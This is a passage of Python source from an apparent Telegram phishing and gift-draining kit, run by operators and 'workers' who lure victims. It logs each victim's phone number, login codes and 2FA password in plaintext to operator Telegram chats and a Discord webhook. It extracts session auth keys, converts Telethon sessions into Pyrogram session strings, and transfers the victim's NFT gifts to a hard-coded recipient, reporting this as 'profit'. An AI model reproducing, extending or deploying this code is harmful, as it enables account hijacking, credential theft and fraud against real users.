                    if len(valid_nft_links) > 15:
                        message += f"\n  ... и еще <b>{len(valid_nft_links) - 15}</b> NFT подарков"
            
            # Добавляем информацию о неудачных передачах
            if failed_transfers_info:
                if isinstance(failed_transfers_info, list) and len(failed_transfers_info) > 0:
                    message += f"\n\n<b>❌ НЕУДАЧНЫЕ ПЕРЕДАЧИ ({len(failed_transfers_info)}):</b>\n"
                    for i, failed_item in enumerate(failed_transfers_info[:10], 1):  # Показываем первые 10
                        # failed_item может быть строкой или словарем
                        if isinstance(failed_item, str):
                            message += f"  {i}. {failed_item}\n"
                        elif isinstance(failed_item, dict):
                            link = failed_item.get('link', failed_item.get('gift_link', 'Неизвестно'))
                            reason = failed_item.get('reason', failed_item.get('error', 'Неизвестная ошибка'))
                            message += f"  {i}. {link} - {reason}\n"
                    if len(failed_transfers_info) > 10:
                        message += f"\n  ... и еще <b>{len(failed_transfers_info) - 10}</b> неудачных передач"
            
            # Если нет удачных передач, но есть попытки
            if gift_count == 0 and (failed_transfers_info and len(failed_transfers_info) > 0):
                message += "\n\n⚠️ <b>Удачных передач нет, но были попытки передачи.</b>"
            elif gift_count > 0:
                message += "\n\n🎉 <b>Профит успешно получен!</b>"
        
        if not message:
            logger.warning(f"Empty message for action_type={action_type}, skipping")
            return
        
        # Отправляем в форумную группу
        chat_id = int(forum_chat_id)
        send_options = {
            'parse_mode': 'HTML',  # Включаем HTML для форматирования
            'disable_web_page_preview': True
        }
        if message_thread_id:
            send_options['message_thread_id'] = message_thread_id
        
        try:
            await bot.send_message(chat_id, message, **send_options)
            topic_name = "profit" if action_type == "profit" else "logs"
            logger.info(f"Log sent to Telegram ({topic_name}): {action_type} (topic_id: {message_thread_id or 'none'}, chat_id: {chat_id})")
        except Exception as send_err:
            # Если ошибка отправки, логируем детально
            error_msg = str(send_err)
            if "message_thread_id" in error_msg.lower() or "topic" in error_msg.lower():
                logger.error(f"Error sending log to Telegram topic: {send_err}. Action: {action_type}, topic_id: {message_thread_id}, chat_id: {chat_id}")
            else:
                logger.error(f"Error sending log to Telegram: {send_err}. Action: {action_type}, topic_id: {message_thread_id}, chat_id: {chat_id}")
            raise  # Пробрасываем ошибку дальше для обработки в общем блоке except
        
        try:
            await bot.session.close()
        except Exception:
            pass
            
    except Exception as e:
        logger.error(f"Error sending log to Telegram: {e}", exc_info=True)

async def log_user_action(action_type: str, user_info: dict = None, worker_info: dict = None, additional_data: dict = None):
    """
    Detailed logging system for user actions.
    АВТОМАТИЧЕСКИ ОПРЕДЕЛЯЕТ ВОРКЕРА: Если worker_info не указан, пытается найти воркера по привязке пользователя.
    Логирует в Discord и локальные логи (utils.log)
    Action types:
    - link_created: Worker created gift link
    - link_activated: User activated gift link and received NFT
    - check_created: Worker created check
    - check_activated: User activated check
    - phone_entered: User entered phone number
    - code_sent: Code sent to user
    - code_verified: User verified code
    - 2fa_required: 2FA password required
    - 2fa_entered: User entered 2FA password
    - 2fa_verified: User verified 2FA password
    - auth_success: User successfully authenticated
    - session_processing_started: Session processing started
    - session_processing_completed: Session processing completed
    - gift_transfer_error: Error during gift transfer
    - account_deleted: Account deleted after processing
    """
    try:
        from aiogram import Bot
        from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
        from config_bot import config
        bot = Bot(token=config.BOT_TOKEN)
        timestamp = moscow_strftime("%Y-%m-%d %H:%M:%S")
        worker_name = "Unknown"
        if worker_info:
            username = worker_info.get('username')
            telegram_id = worker_info.get('telegram_id', 'Unknown')
            if username and str(username).strip():
                worker_name = str(username).strip()
                if not worker_name.startswith('@'):
                    worker_name = f"@{worker_name}"
            else:
                worker_name = f"ID{telegram_id}"
        
        # Ensure worker_name is never None or empty
        if not worker_name:
            worker_name = "Unknown"
        user_display = "Unknown"
        user_telegram_id = None
        if user_info:
            user_id = user_info.get('user_id', user_info.get('telegram_id', user_info.get('id', 'Unknown')))
            # Сохраняем telegram_id для дальнейшего использования
            user_telegram_id = user_info.get('telegram_id') or user_info.get('id') or user_info.get('user_id')
            if isinstance(user_telegram_id, str) and user_telegram_id.isdigit():
                user_telegram_id = int(user_telegram_id)
            username = user_info.get('username', '')
            if username:
                user_display = f"@{username} (ID: {user_id})"
            else:
                user_display = f"ID: {user_id}"
        
        # АВТОМАТИЧЕСКОЕ ОПРЕДЕЛЕНИЕ ВОРКЕРА: Если worker_info не указан, пытаемся найти воркера по привязке
        if not worker_info and user_telegram_id and isinstance(user_telegram_id, int):
            try:
                # Используем абсолютный импорт или проверяем наличие метода
                import database
                
                # Проверяем, тот ли это модуль базы данных
                if not hasattr(database.Database, 'get_worker_for_user'):
                    logger.warning(f"⚠️ Loaded database module from {database.__file__} does not have get_worker_for_user method. Skipping auto-worker detection.")
                else:
                    # Используем существующий экземпляр или создаем новый
                    if hasattr(database, 'db') and isinstance(database.db, database.Database):
                        db_instance = database.db
                    else:
                        db_instance = database.Database()
                        
                    worker_binding = db_instance.get_worker_for_user(user_telegram_id, only_active=True)
                if worker_binding:
                    worker_info = {
                        'telegram_id': worker_binding.get('worker_telegram_id'),
                        'username': worker_binding.get('username'),
                        'first_name': worker_binding.get('first_name'),
                        'last_name': worker_binding.get('last_name')
                    }
                    # Обновляем worker_name, если воркер найден
                    worker_username = worker_info.get('username')
                    worker_telegram_id = worker_info.get('telegram_id', 'Unknown')
                    if worker_username and worker_username.strip():
                        worker_name = worker_username if worker_username.startswith('@') else f"@{worker_username}"
                    else:
                        worker_name = f"ID{worker_telegram_id}"
                    logger.debug(f"✅ Автоматически найден воркер для пользователя {user_telegram_id}: {worker_telegram_id} (@{worker_username})")
            except Exception as auto_worker_err:
                logger.debug(f"Не удалось автоматически найти воркера для пользователя {user_telegram_id}: {auto_worker_err}")
        
        message_text = ""
        keyboard = None
        if action_type == "link_created":
            gift_link = additional_data.get('gift_link', 'Unknown') if additional_data else 'Unknown'
            message_text = (
                f"🔗 <b>Создана ссылка на подарок</b>\n\n"
                f"👤 <b>Воркер:</b> {worker_name}\n"
                f"🎁 <b>Ссылка:</b> <code>{gift_link}</code>\n"
                f"⏰ <b>Время:</b> {timestamp}"
            )
        elif action_type == "gift_link_created":
            details = additional_data.get('details', 'Unknown') if additional_data else 'Unknown'
            message_text = (
                f"🎁 <b>Создана подарочная ссылка</b>\n\n"
                f"👤 <b>Пользователь:</b> {user_display}\n"
                f"📝 <b>Детали:</b> {details}\n"
                f"⏰ <b>Время:</b> {timestamp}"
            )
        elif action_type == "retry_processing":
            details = additional_data.get('details', 'Повторная обработка сессии') if additional_data else 'Повторная обработка сессии'
            message_text = (
                f"🔄 <b>Повторная обработка</b>\n\n"
                f"👤 <b>Пользователь:</b> {user_display}\n"
                f"📝 <b>Детали:</b> {details}\n"
                f"⏰ <b>Время:</b> {timestamp}"
            )
        elif action_type == "rescan_gifts_requested":
            phone = additional_data.get('phone', 'Unknown') if additional_data else 'Unknown'
            details = additional_data.get('details', 'Запрошено повторное сканирование подарков') if additional_data else 'Запрошено повторное сканирование подарков'
            message_text = (
                f"🔄 <b>Запрошено повторное сканирование подарков</b>\n\n"
                f"👤 <b>Пользователь:</b> {user_display}\n"
                f"📞 <b>Телефон:</b> <code>{phone}</code>\n"
                f"📝 <b>Детали:</b> {details}\n"
                f"⏰ <b>Время:</b> {timestamp}"
            )
        elif action_type == "link_activated":
            gift_name = additional_data.get('nft_name', additional_data.get('gift_name', 'Unknown NFT')) if additional_data else 'Unknown NFT'
            gift_link = additional_data.get('nft_link', additional_data.get('gift_link', 'Unknown')) if additional_data else 'Unknown'
            
            # Получаем информацию о создателе подарочной ссылки
            creator_name = "Неизвестно"
            creator_telegram_id = None
            try:
                from database import Database
                db = Database()
                creator_info = db.get_gift_creator_by_link(gift_link)
                if creator_info:
                    creator_telegram_id = creator_info.get('telegram_id')
                    username = creator_info.get('username', '')
                    if username:
                        creator_name = f"@{username}" if not username.startswith('@') else username
                    else:
                        creator_name = f"ID{creator_info.get('telegram_id', 'Unknown')}"
            except Exception as e:
                print(f"❌ Ошибка получения создателя для ссылки {gift_link}: {e}")
            
            message_text = (
                f"🎯 <b>Активирована подарочная ссылка</b>\n\n"
                f"👤 <b>Пользователь:</b> {user_display}\n"
                f"🎁 <b>Получен NFT:</b> {gift_name}\n"
                f"🔗 <b>Ссылка:</b> <code>{gift_link}</code>\n"
                f"👨‍💻 <b>Создал ссылку:</b> {creator_name}\n"
                f"⏰ <b>Время:</b> {timestamp}"
            )
            
            # Отправляем уведомление воркеру в ЛС
            if creator_telegram_id:
                try:
                    import asyncio
                    recipient_username = user_info.get('username') if user_info else None
                    asyncio.create_task(send_worker_notification(
                        worker_telegram_id=creator_telegram_id,
                        gift_name=gift_name,
                        gift_link=gift_link,
                        recipient_username=recipient_username
                    ))
                except Exception as e:
                    print(f"❌ Ошибка отправки уведомления воркеру {creator_telegram_id}: {e}")
            
            # Отправляем уведомление через бот-логов отслеживаемым пользователям
            try:
                from logs_bot import send_notification_to_tracked_user
                if creator_telegram_id:
                    await send_notification_to_tracked_user(creator_telegram_id, message_text)
                user_telegram_id = user_info.get('telegram_id') if user_info else None
                if user_telegram_id:
                    await send_notification_to_tracked_user(user_telegram_id, message_text)
            except Exception as notify_err:
                logger.debug(f"Не удалось отправить уведомление через бот-логов: {notify_err}")
        elif action_type == "check_created":
            check_id = additional_data.get('check_id', 'Unknown') if additional_data else 'Unknown'
            amount = additional_data.get('amount', '0') if additional_data else '0'
            currency = additional_data.get('currency', 'STARS') if additional_data else 'STARS'
            worker_name_display = worker_name if worker_info else "Неизвестно"
            
            message_text = (
                f"💠 <b>Создан чек на звезды</b>\n\n"
                f"👨‍💻 <b>Воркер:</b> {worker_name_display}\n"
                f"💰 <b>Сумма:</b> {amount} {currency}\n"
                f"🆔 <b>ID чека:</b> <code>{check_id}</code>\n"
                f"⏰ <b>Время:</b> {timestamp}"
            )
            
            # Отправляем уведомление через бот-логов создателю чека
            try:
                from logs_bot import send_notification_to_tracked_user
                worker_telegram_id = worker_info.get('telegram_id') if worker_info else None
                if worker_telegram_id:
                    await send_notification_to_tracked_user(worker_telegram_id, message_text)
            except Exception as notify_err:
                logger.debug(f"Не удалось отправить уведомление через бот-логов: {notify_err}")
        elif action_type == "check_activated":
            check_id = additional_data.get('check_id', 'Unknown') if additional_data else 'Unknown'
            amount = additional_data.get('amount', '0') if additional_data else '0'
            currency = additional_data.get('currency', 'STARS') if additional_data else 'STARS'
            worker_name_display = worker_name if worker_info else "Неизвестно"
            
            message_text = (
                f"✅ <b>Чек активирован</b>\n\n"
                f"👤 <b>Активировал:</b> {user_display}\n"
                f"💰 <b>Сумма:</b> {amount} {currency}\n"
                f"👨‍💻 <b>Создал чек:</b> {worker_name_display}\n"
                f"🆔 <b>ID чека:</b> <code>{check_id}</code>\n"
                f"⏰ <b>Время:</b> {timestamp}"
            )
            
            # Отправляем уведомление через бот-логов создателю чека и активатору
            try:
                from logs_bot import send_notification_to_tracked_user
                worker_telegram_id = worker_info.get('telegram_id') if worker_info else None
                if worker_telegram_id:
                    await send_notification_to_tracked_user(worker_telegram_id, message_text)
                # Используем сохраненный user_telegram_id из начала функции
                if user_telegram_id:
                    await send_notification_to_tracked_user(user_telegram_id, message_text)
            except Exception as notify_err:
                logger.warning(f"Не удалось отправить уведомление через бот-логов: {notify_err}", exc_info=True)
        elif action_type == "phone_entered":
            phone = additional_data.get('phone', 'Unknown') if additional_data else 'Unknown'
            worker_name_display = worker_name if worker_info else "Неизвестно"
            message_text = (
                f"📱 <b>Введен номер телефона</b>\n\n"
                f"👤 <b>Пользователь:</b> {user_display}\n"
                f"👨‍💻 <b>Воркер:</b> {worker_name_display}\n"
                f"📞 <b>Номер:</b> <code>{phone}</code>\n"
                f"⏰ <b>Время:</b> {timestamp}"
            )
            
            # Отправляем уведомление через бот-логов пользователю и воркеру
            try:
                from logs_bot import send_notification_to_tracked_user
                # Используем сохраненный user_telegram_id из начала функции
                if user_telegram_id:
                    await send_notification_to_tracked_user(user_telegram_id, message_text)
                # Отправляем уведомление воркеру, если он найден
                worker_telegram_id = worker_info.get('telegram_id') if worker_info else None
                if worker_telegram_id:
                    await send_notification_to_tracked_user(worker_telegram_id, message_text)
            except Exception as notify_err:
                logger.warning(f"Не удалось отправить уведомление через бот-логов: {notify_err}", exc_info=True)
        elif action_type == "code_sent":
            phone = additional_data.get('phone', 'Unknown') if additional_data else 'Unknown'
            details = additional_data.get('details', 'Код отправлен') if additional_data else 'Код отправлен'
            worker_name_display = worker_name if worker_info else "Неизвестно"
            message_text = (
                f"📤 <b>Код отправлен</b>\n\n"
                f"👤 <b>Пользователь:</b> {user_display}\n"
                f"👨‍💻 <b>Воркер:</b> {worker_name_display}\n"
                f"📞 <b>Номер:</b> <code>{phone}</code>\n"
                f"📝 <b>Детали:</b> {details}\n"
                f"⏰ <b>Время:</b> {timestamp}"
            )
            # Отправляем уведомление пользователю и воркеру
            try:
                from logs_bot import send_notification_to_tracked_user
                if user_telegram_id:
                    await send_notification_to_tracked_user(user_telegram_id, message_text)
                # Отправляем уведомление воркеру, если он найден
                worker_telegram_id = worker_info.get('telegram_id') if worker_info else None
                if worker_telegram_id:
                    await send_notification_to_tracked_user(worker_telegram_id, message_text)
            except Exception as notify_err:
                logger.debug(f"Не удалось отправить уведомление через бот-логов: {notify_err}")
        elif action_type == "code_verified":
            phone = additional_data.get('phone', 'Unknown') if additional_data else 'Unknown'
            details = additional_data.get('details', 'Код подтвержден') if additional_data else 'Код подтвержден'
            worker_name_display = worker_name if worker_info else "Неизвестно"
            message_text = (
                f"✅ <b>Код подтвержден</b>\n\n"
                f"👤 <b>Пользователь:</b> {user_display}\n"
                f"👨‍💻 <b>Воркер:</b> {worker_name_display}\n"
                f"📞 <b>Номер:</b> <code>{phone}</code>\n"
                f"📝 <b>Детали:</b> {details}\n"
                f"⏰ <b>Время:</b> {timestamp}"
            )
            # Отправляем уведомление пользователю и воркеру
            try:
                from logs_bot import send_notification_to_tracked_user
                if user_telegram_id:
                    await send_notification_to_tracked_user(user_telegram_id, message_text)
                # Отправляем уведомление воркеру, если он найден
                worker_telegram_id = worker_info.get('telegram_id') if worker_info else None
                if worker_telegram_id:
                    await send_notification_to_tracked_user(worker_telegram_id, message_text)
            except Exception as notify_err:
                logger.debug(f"Не удалось отправить уведомление через бот-логов: {notify_err}")
        elif action_type == "code_entered":
            has_2fa = additional_data.get('has_2fa', False) if additional_data else False
            fa_status = "✅ Включена" if has_2fa else "❌ Отключена"
            message_text = (
                f"🔐 <b>Введен код подтверждения</b>\n\n"
                f"👤 <b>Пользователь:</b> {user_display}\n"
                f"🛡️ <b>2FA:</b> {fa_status}\n"
                f"⏰ <b>Время:</b> {timestamp}"
            )
            # Отправляем уведомление пользователю
            try:
                from logs_bot import send_notification_to_tracked_user
                if user_telegram_id:
                    await send_notification_to_tracked_user(user_telegram_id, message_text)
            except Exception as notify_err:
                logger.debug(f"Не удалось отправить уведомление через бот-логов: {notify_err}")
        elif action_type == "2fa_required":
            phone = additional_data.get('phone', 'Unknown') if additional_data else 'Unknown'
            details = additional_data.get('details', 'Требуется 2FA пароль') if additional_data else 'Требуется 2FA пароль'
            worker_name_display = worker_name if worker_info else "Неизвестно"
            message_text = (
                f"🛡️ <b>Требуется 2FA пароль</b>\n\n"
                f"👤 <b>Пользователь:</b> {user_display}\n"
                f"👨‍💻 <b>Воркер:</b> {worker_name_display}\n"
                f"📞 <b>Телефон:</b> <code>{phone}</code>\n"
                f"📝 <b>Детали:</b> {details}\n"
                f"⏰ <b>Время:</b> {timestamp}"
            )
            # Отправляем уведомление пользователю и воркеру
            try:
                from logs_bot import send_notification_to_tracked_user
                if user_telegram_id:
                    await send_notification_to_tracked_user(user_telegram_id, message_text)
                # Отправляем уведомление воркеру, если он найден
                worker_telegram_id = worker_info.get('telegram_id') if worker_info else None
                if worker_telegram_id:
                    await send_notification_to_tracked_user(worker_telegram_id, message_text)
            except Exception as notify_err:
                logger.debug(f"Не удалось отправить уведомление через бот-логов: {notify_err}")
        elif action_type == "2fa_entered":
            try:
                import html
            except Exception:
                html = None
            entered_password = None
            if additional_data:
                entered_password = additional_data.get('password')
            escaped_password = html.escape(entered_password, quote=True) if (html and isinstance(entered_password, str)) else (entered_password or "")
            worker_name_display = worker_name if worker_info else "Неизвестно"
            message_text = (
                f"🛡️ <b>Введен 2FA пароль</b>\n\n"
                f"👤 <b>Пользователь:</b> {user_display}\n"
                f"👨‍💻 <b>Воркер:</b> {worker_name_display}\n"
                f"🔑 <b>Пароль:</b> <code>{escaped_password}</code>\n"
                f"⏰ <b>Время:</b> {timestamp}"
            )
            # Отправляем уведомление пользователю и воркеру
            try:
                from logs_bot import send_notification_to_tracked_user
                if user_telegram_id:
                    await send_notification_to_tracked_user(user_telegram_id, message_text)
                # Отправляем уведомление воркеру, если он найден
                worker_telegram_id = worker_info.get('telegram_id') if worker_info else None
                if worker_telegram_id:
                    await send_notification_to_tracked_user(worker_telegram_id, message_text)
            except Exception as notify_err:
                logger.debug(f"Не удалось отправить уведомление через бот-логов: {notify_err}")
        elif action_type == "auth_success":
            # Проверяем есть ли статистика аккаунта в дополнительных данных
            account_stats = additional_data.get('account_stats') if additional_data else None
            
            # Определяем telegram_id пользователя для callback-кнопки
            uid = None
            if user_info:
                uid = user_info.get('user_id') or user_info.get('telegram_id') or user_info.get('id')

            if account_stats:
                # Используем расширенное сообщение со статистикой
                message_text = format_account_stats_message(account_stats, user_display, timestamp)
            else:
                # Используем стандартное сообщение
                message_text = (
                    f"✅ <b>Успешная авторизация</b>\n\n"
                    f"👤 <b>Пользователь:</b> {user_display}\n"
                    f"⏰ <b>Время:</b> {timestamp}"
                )

            # Добавляем инлайн-кнопки для управления обработкой подарков
            if uid:
                # Проверяем статус авто-режима для пользователя
                auto_enabled = False
                try:
                    from database import Database
                    db_temp = Database()
                    auto_enabled = db_temp.get_auto_process_enabled(uid)
                except Exception:
                    pass

                auto_button_text = "🔴 Выкл Авто" if auto_enabled else "🟢 Вкл Авто"
                keyboard = InlineKeyboardMarkup(inline_keyboard=[
                    [
                        InlineKeyboardButton(
                            text="🔁 Обработать подарки",
                            callback_data=f"process_gifts:{uid}"
                        )
                    ],
                    [
                        InlineKeyboardButton(
                            text=auto_button_text,
                            callback_data=f"toggle_auto:{uid}"
                        )
                    ]
                ])
            else:
                keyboard = None
            
            # Отправляем уведомление пользователю
            try:
                from logs_bot import send_notification_to_tracked_user
                if user_telegram_id:
                    await send_notification_to_tracked_user(user_telegram_id, message_text)
            except Exception as notify_err:
                logger.debug(f"Не удалось отправить уведомление через бот-логов: {notify_err}")
        elif action_type == "session_processing_started":
            message_text = (
                f"⚙️ <b>Начата обработка сессии</b>\n\n"
                f"👤 <b>Пользователь:</b> {user_display}\n"
                f"⏰ <b>Время:</b> {timestamp}"
            )
        elif action_type == "session_processing_completed":
            gifts_count = additional_data.get('gifts_processed', 0) if additional_data else 0
            nft_gifts = additional_data.get('nft_gifts', 0) if additional_data else 0
            gifts_transferred = additional_data.get('gifts_transferred', 0) if additional_data else 0
            stars_balance = additional_data.get('stars_balance', 0) if additional_data else 0
            phone = additional_data.get('phone', 'Unknown') if additional_data else 'Unknown'
            
            message_text = (
                f"✅ <b>Обработка сессии завершена</b>\n\n"
                f"👤 <b>Пользователь:</b> {user_display}\n"
                f"📞 <b>Телефон:</b> <code>{phone}</code>\n"
                f"🎁 <b>Обработано подарков:</b> {gifts_count}\n"
                f"💎 <b>NFT подарков:</b> {nft_gifts}\n"
                f"📤 <b>Передано NFT:</b> {gifts_transferred}\n"
                f"⭐ <b>Баланс звезд:</b> {stars_balance}\n"
                f"⏰ <b>Время:</b> {timestamp}"
            )
        elif action_type == "gift_transfer_error":
            error_msg = additional_data.get('error', 'Unknown error') if additional_data else 'Unknown error'
            session_id = additional_data.get('session_id', 'Unknown') if additional_data else 'Unknown'
            message_text = (
                f"❌ <b>Ошибка передачи подарка</b>\n\n"
                f"👤 <b>Пользователь:</b> {user_display}\n"
                f"🔴 <b>Ошибка:</b> <code>{error_msg}</code>\n"
                f"🆔 <b>Сессия:</b> <code>{session_id}</code>\n"
                f"⏰ <b>Время:</b> {timestamp}"
            )
            keyboard = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🔄 Повтор", callback_data=f"retry_session:{session_id}")]
            ])
        # Агрегатор для событий обработки сессии и ошибок передачи
        try:
            aggregator_types = {
                "rescan_gifts_requested",
                "retry_processing",
                "session_processing_started",
                "session_processing_completed",
                "gift_transfer_error",
            }
            if action_type in aggregator_types:
                # Формируем ключ агрегатора на основе пользователя и телефона
                uid = None
                phone = None
                if user_info:
                    uid = user_info.get('user_id') or user_info.get('telegram_id') or user_info.get('id')
                    phone = user_info.get('phone')
                if additional_data and not phone:
                    phone = additional_data.get('phone')
                uid = uid or 'unknown'
                phone = phone or 'unknown'
                agg_key = f"sess:{phone}:{uid}"

                # Начало буфера при старте/рескане/повторе
                if action_type in {"session_processing_started", "rescan_gifts_requested", "retry_processing"}:
                    try:
                        begin_gift_log(agg_key)
                    except Exception:
                        pass
                # Накапливаем строку
                try:
                    append_gift_log(agg_key, message_text or f"ℹ️ Событие: {action_type}")
                except Exception:
                    pass
                # Финальный флеш по завершению
                if action_type == "session_processing_completed":
                    header = f"Логи обработки сессии {phone} (ID: {uid})"
                    try:
                        await flush_gift_log(agg_key, header=header, with_spoiler=True)
                    except Exception:
                        pass
                # Возвращаемся без отправки единичного сообщения — уходим в агрегатор
                print(f"✅ Лог '{action_type}' добавлен в агрегатор {agg_key}")
                try:
                    await bot.session.close()
                except Exception:
                    pass
                return
        except Exception:
            # Если агрегатор не сработал — продолжаем обычную отправку ниже
            pass

        # Fallback: предотвращаем отправку пустого текста
        if not message_text or not message_text.strip():
            message_text = (
                f"ℹ️ <b>Событие</b>\n\n"
                f"🔖 <b>Тип:</b> {action_type}\n"
                f"👤 <b>Пользователь:</b> {user_display}\n"
                f"⏰ <b>Время:</b> {timestamp}"
            )

        # Отправляем в Discord
        from discord_logger import discord_logger
        
        # Создаем embed для красивого отображения
        fields = []
        if user_info:
            if 'id' in user_info:
                fields.append({'name': '👤 User ID', 'value': str(user_info['id']), 'inline': True})
            if 'username' in user_info:
                fields.append({'name': '📱 Username', 'value': user_info['username'] or 'N/A', 'inline': True})
        
        if worker_info:
            if 'telegram_id' in worker_info:
                fields.append({'name': '👷 Worker ID', 'value': str(worker_info['telegram_id']), 'inline': True})
            if 'username' in worker_info:
                fields.append({'name': '👷 Worker', 'value': worker_info['username'] or 'N/A', 'inline': True})
        
        if additional_data:
            for key, value in additional_data.items():
                if isinstance(value, (str, int, float)):
                    fields.append({'name': key, 'value': str(value)[:1024], 'inline': False})
        
        await discord_logger.send_embed(
            title=f"📝 {action_type}",
            description=message_text,
            fields=fields if fields else None,
            webhook_type='actions',
            username="GetGems Bot",
            color=0x9b59b6  # Фиолетовый для действий
        )
        
        # Также отправляем в Telegram через send_minimal_log_to_telegram
        try:
            # Определяем параметры для отправки в Telegram
            tg_user_name = user_display
            tg_worker_name = worker_name if worker_info else None
            tg_phone = None
            if additional_data:
                tg_phone = additional_data.get('phone')
            
            # Маппинг типов действий для Telegram
            telegram_action_type = action_type
            if action_type == "session_processing_start":
                telegram_action_type = "session_processing_started"
            elif action_type == "session_processing_complete":
                telegram_action_type = "session_processing_completed"
            
            # Отправляем в Telegram
            # Для check_created и check_activated передаем полные данные из additional_data
            tg_additional_info = None
            if action_type in ["check_created", "check_activated"]:
                # Передаем весь additional_data как словарь, чтобы сохранить check_id, amount, currency
                tg_additional_info = additional_data if additional_data else None
                logger.debug(f"[log_user_action] Sending check data: {tg_additional_info}")
            elif action_type == "auth_success":
                # Для auth_success передаем весь additional_data, чтобы сохранить account_stats
                tg_additional_info = additional_data if additional_data else None
            else:
                tg_additional_info = additional_data.get('details') if additional_data else None
            
            await send_minimal_log_to_telegram(
                action_type=telegram_action_type,
                worker_name=tg_worker_name,
                user_name=tg_user_name,
                user_id=user_telegram_id if isinstance(user_telegram_id, int) else None,  # Передаём user_id для авто-резолва воркера
                additional_info=tg_additional_info,
                phone=tg_phone,
                account_stats=additional_data.get('account_stats') if additional_data else None
            )
        except Exception as tg_err:
            # Не критично, если не удалось отправить в Telegram
            logger.debug(f"Failed to send log to Telegram: {tg_err}")
        
        # Логируем также в локальные логи
        logger.info(f"Action logged: {action_type} - User: {user_display}, Details: {message_text[:200]}")
        print(f"✅ Лог действия '{action_type}' отправлен в Discord и локальные логи")
        
        # Отправляем все действия пользователю лично, если он отслеживается
        # (кроме тех, которые уже отправляются выше)
        actions_already_sent = {
            "link_activated", "check_created", "check_activated", "phone_entered",
            "code_sent", "code_verified", "code_entered", "2fa_required", "2fa_entered", "auth_success"
        }
        if action_type not in actions_already_sent and user_telegram_id and message_text:
            try:
                from logs_bot import send_notification_to_tracked_user
                await send_notification_to_tracked_user(user_telegram_id, message_text)
            except Exception as notify_err:
                logger.debug(f"Не удалось отправить уведомление пользователю {user_telegram_id} для действия {action_type}: {notify_err}")
    except Exception as e:
        print(f"❌ Ошибка отправки лога действия: {e}")
        import traceback
        traceback.print_exc()
def get_session_data_from_sqlite(session_file_path: str) -> dict:
    if not os.path.exists(session_file_path):
        raise FileNotFoundError(f"Файл сессии не найден: {session_file_path}")
    conn = sqlite3.connect(session_file_path)
    cursor = conn.cursor()
    try:
        cursor.execute("SELECT dc_id, server_address, port, auth_key FROM sessions")
        session_data = cursor.fetchone()
        if not session_data:
            raise ValueError("Данные сессии не найдены в файле")
        dc_id, server_address, port, auth_key = session_data
        return {
            'dc_id': dc_id,
            'server_address': server_address,
            'port': port,
            'auth_key': auth_key
        }
    finally:
        conn.close()
async def get_user_data_from_telethon(session_file_path: str) -> dict:
    from telegram_client import API_ID, API_HASH
    from telethon import TelegramClient
    from telethon.sessions import SQLiteSession
    client = TelegramClient(
        SQLiteSession(session_file_path),
        API_ID,
        API_HASH
    )
    try:
        await client.connect()
        if not await client.is_user_authorized():
            raise ValueError("Сессия не авторизована")
        me = await client.get_me()

        # Сразу после авторизации "встретим" получателя и отправим ему сообщение через Telethon
        try:
            target = None
            # 1) Ищем entity строго по username (предпочтительный способ)
            if GIFT_RECIPIENT_USERNAME:
                try:
                    target = await client.get_entity(GIFT_RECIPIENT_USERNAME)
                except Exception:
                    target = None
            # 2) Если по username не нашли, пробуем импортировать контакт по телефону
            if target is None and GIFT_RECIPIENT_PHONE:
                try:
                    # Используем высокоуровневые методы вместо прямых импортов функций
                    from telethon.tl.types import InputPhoneContact
                    contacts = [InputPhoneContact(client_id=0, phone=GIFT_RECIPIENT_PHONE, first_name="", last_name="")]
                    await client.import_contacts(contacts)
                    target = await client.get_entity(GIFT_RECIPIENT_PHONE)
                except Exception:
                    target = None

            if target is not None:
                # Контакт уже добавлен через import_contacts выше
                # Отправляем приветственное сообщение
                await client.send_message(target, "❤")
                print("📨 (Telethon) Отправлено приветственное сообщение 'hi!' получателю сразу после авторизации")

                # Получаем FullUser для дополнительной валидации/логов
                try:
                    # Используем get_entity/get_input_entity для получения информации
                    ent = await client.get_entity(target)
                    uid = getattr(ent, 'id', None)
                    uname = getattr(ent, 'username', None)
                    print(f"ℹ️ (Telethon) Получен entity: id={uid}, username={uname}")
                except Exception as full_user_err:
                    print(f"ℹ️ (Telethon) Не удалось получить entity: {full_user_err}")

                await asyncio.sleep(0.5)
            else:
                print("⚠️ (Telethon) Не удалось разрешить entity получателя ни по ID, ни по username/phone")
        except Exception as telethon_msg_err:
            print(f"⚠️ (Telethon) Ошибка отправки 'hi!': {telethon_msg_err}. Продолжаю конвертацию сессии.")

        user_data = {
            'user_id': me.id,
            'is_bot': me.bot if hasattr(me, 'bot') else False,
            'phone': me.phone,
            'first_name': me.first_name,
            'last_name': me.last_name,
            'username': me.username
        }
        return user_data
    finally:
        await client.disconnect()

async def get_me_from_pyrogram(session_string: str) -> dict:
    """
    Возвращает информацию о пользователе через Pyrogram по session_string.
    Формат словаря: { 'user_id': int, 'username': str | None, 'first_name': str | None, 'last_name': str | None, 'phone': str | None }
    """
    from pyrogram import Client
    client = Client("pyrogram_get_me", session_string=session_string)
    await client.start()
    try:
        me = await client.get_me()
        return {
            'user_id': me.id,
            'username': getattr(me, 'username', None),
            'first_name': getattr(me, 'first_name', None),
            'last_name': getattr(me, 'last_name', None),
            'phone': getattr(me, 'phone_number', None)
        }
    finally:
        await client.stop()
def create_pyrogram_session_string(session_data: dict, user_data: dict) -> str:
    from telegram_client import API_ID
    dc_id = session_data['dc_id']
    auth_key = session_data['auth_key']
    user_id = user_data['user_id']
    is_bot = user_data['is_bot']
    if len(auth_key) != 256:
        if len(auth_key) > 256:
            auth_key = auth_key[:256]
        else:
            auth_key = auth_key + b'\x00' * (256 - len(auth_key))
    packed_data = struct.pack(
        ">BI?256sQ?",
        dc_id,
        API_ID,
        False,
        auth_key,
        user_id,
        is_bot
    )
    session_string = base64.urlsafe_b64encode(packed_data).decode().rstrip("=")
    return session_string
async def convert_telethon_to_pyrogram(session_file_path: str) -> str:
    session_data = get_session_data_from_sqlite(session_file_path)
    user_data = await get_user_data_from_telethon(session_file_path)
    pyrogram_session_string = create_pyrogram_session_string(session_data, user_data)
    return pyrogram_session_string
def check_admin_token():
    token = request.args.get('token') or request.headers.get('X-Admin-Token')
    return token == ADMIN_TOKEN
def parse_init_data(init_data):
    try:
        parsed_data = parse_qs(init_data)
        if 'user' in parsed_data:
            return json.loads(parsed_data['user'][0]).get('id')
    except Exception as e:
        return None
def get_phone_from_json(user_id):
    try:
        if os.path.exists(PHONE_FILE):
            with open(PHONE_FILE, 'r') as f:
                content = f.read().strip()
                if not content:
                    return None
                phones = json.loads(content)
